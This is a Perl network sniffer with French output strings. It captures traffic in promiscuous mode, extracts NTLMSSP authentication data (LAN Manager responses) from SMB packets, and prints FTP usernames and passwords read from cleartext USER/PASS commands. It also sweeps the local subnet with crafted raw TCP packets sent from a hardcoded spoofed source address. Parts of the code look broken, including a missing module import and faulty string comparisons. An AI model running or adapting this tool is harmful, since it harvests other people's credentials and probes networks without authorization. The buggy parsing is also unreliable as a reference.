
#!/usr/bin/perl -w
use strict;
use warnings;
use Net::RawIP;
use Net::Pcap::Easy;
use Net::MAC;
use Net::MAC::Vendor;
use Net::DHCP::Packet;
use Getopt::Long;
use Socket;

my $SHOW_MAC = 0;
my $listen_mode;
GetOptions ("listen" => \$listen_mode);
my $i =1;

sub StartCap()
{
    my $npe = Net::Pcap::Easy->new(
        timeout_in_ms    => 0, # 0ms means forever
        promiscuous      => 1, # true or false
        bytes_to_capture    => 1024,
	tcp_callback => sub {
	
		my ($npe, $ether, $ip, $tcp, $header) = @_;
        if ($tcp->{dest_port} == 445)
        {
            print "SMB Packet $i : ";
            my $packet = ($ether->{data});

            #Convert all packet in Hexadecimal
            my $pack_hex = unpack("H*", $packet );

            # Find NTMLSSP in packet SMB and print the packet in hex
            my $pack_find_NTLMSSP=index($pack_hex, "4e544c4d53535000");
            my $pack_type1=index($pack_hex, "4e544c4d535350000100");
            my $pack_type2=index($pack_hex, "4e544c4d535350000200");
            my $pack_type3=index($pack_hex, "4e544c4d5353500003000000");

            my $packet_offset = substr $pack_hex, $pack_type3; 
     
            if ($pack_find_NTLMSSP != -1)
            {
                if ($pack_type1 != -1)
                {
                    print "NTLMSSP - Negotiate Packet position : ";
                    print $pack_type1 ."\n";
                }
                if ($pack_type2 != -1)
                {
                    print "NTLMSSP - Challenge Packet position : ";
                    print $pack_type2 ."\n";
                }
                if ($pack_type3 != -1)
                {
                    print "NTLMSSP - Authenticate position : ";
                    print $pack_type3 ."\n"; 
                    my $Ntlmssp_packet  = substr $pack_hex, $pack_type3+24;
                   


                    my $lenght_hex = substr $Ntlmssp_packet,0,4;
                    my $maxlenght_hex = substr $Ntlmssp_packet,4,4;
                    my $offset_hex= substr $Ntlmssp_packet,8,8;

                    my $offset = no_null_bytes($offset_hex);
                    my $maxlenght = no_null_bytes($maxlenght_hex);
                    my $lenght = no_null_bytes($lenght_hex);
                 
                    print "Lan Manager Response: \n Lenght: ".hex($lenght)."  \n Maxlenght:".hex($maxlenght)."  \n Offset:".hex($offset)."  \n";
                    
                    my $lan_manager_hex = substr $packet_offset,(hex($offset))+(hex($offset)),(hex($maxlenght))+(hex($maxlenght));

                    print $pack_hex."\n";
                    print $lan_manager_hex;
                  

                }

            }
            else 
            {
                print "NTLMSSP not found\n";
            }
            $i++;
        }
		if ($tcp->{dest_port} == 21)
		{			

  			
  			if ($tcp->{data})
			{
				my $data = $tcp->{data};
				my @table = split(" ",$data);
				if (exists($table[0]) && $table[0] eq 'USER' && exists($table[1]))
				{
					print "Le pseudo est : " .$table[1] ."\n";
				}
				if(exists($table[0])&& $table[0]  eq 'PASS' && exists($table[1]))
				{
					print "Le mot de passe est : " .$table[1] ."\n"; 
				}
			}
			
		}
	}
    );
    print "Network IP : " .$npe->network ."\n";
    print "Netmask : " .$npe->netmask ."\n";
    my $block = GetLocalNetInfo($npe->network, $npe->netmask);

    print "la taille du réseau est:".$block->size()."\n";
    print "premiere adresse :".$block->first()."\n";
    print "derniere adresse :".$block->last()."\n";
    if (!$listen_mode)
    {
        MapNetwork($block->first(),$block->last());
    }
    1 while $npe->loop;
}

sub IPFormat
{
    return join ".", map { hex }($_[0] =~ /([[:xdigit:]]{2})/g)
}

sub MacFormat
{
    return join ":", ($_[0] =~ /([[:xdigit:]]{2})/g);
}


sub ResolveHostName {
    my $hostname = gethostbyaddr(inet_aton($_[0]), AF_INET);
    if ($hostname)
    {
	return $hostname;
    }
    else
    {
	return "Unknown";
    }
}

sub LookupMacVendor {
    my $cmac = Net::MAC->new('mac' => $_[0])->convert(
            'base' => 16,
            'bit_group' => 8,
            'delimiter' => ':'
    ); 
    my $vendor = Net::MAC::Vendor::lookup( $cmac );;
    if (@$vendor[0])
    {
        return @$vendor[0];
    }
    else
    {
        return "Unknown"
    }
}

sub GetLocalNetInfo {
    my $block = new Net::Netmask($_[0],$_[1]);
    return $block;
}

sub MapNetwork {
    my $currentip; 
    my ($a,$b,$c,$d) = split(/\./, $_[0]);

    do
    {
        $d++;
        $currentip = "$a.$b.$c.$d";
        print "Probing : $a.$b.$c.$d\n";
        my $n = Net::RawIP->new({
                        ip  => {
                                saddr => '10.8.99.230',
                                daddr => $currentip,
                               },
                      },
                      tcp => {
                                source => 31337,
                                dest   => 54321,
                                psh    => 1,
                                syn    => 0,
                              });;
        $n->send;
        $n->ethnew("wlan0");
        if ($d == 255)
        {
            $c++;
            $d = 0;
        }
        if ($c == 255)
        {
            $b++;
            $c =0;
        }
        if ($b == 255)
        {
            $a++;
            $b = 0;
        }

    } while ($currentip ne $_[1]);

}

sub no_null_bytes
{
    my $i=0;
    my $chaine_final = "";
    my $chaine_bla;
    do
    {
        $chaine_bla=$chaine_bla.$chaine_final;
        $chaine_final=  substr $_[0],$i,2;
        
        $i=$i+2;
    }
    while ($chaine_final != "00");
    return $chaine_bla;
}

StartCap();
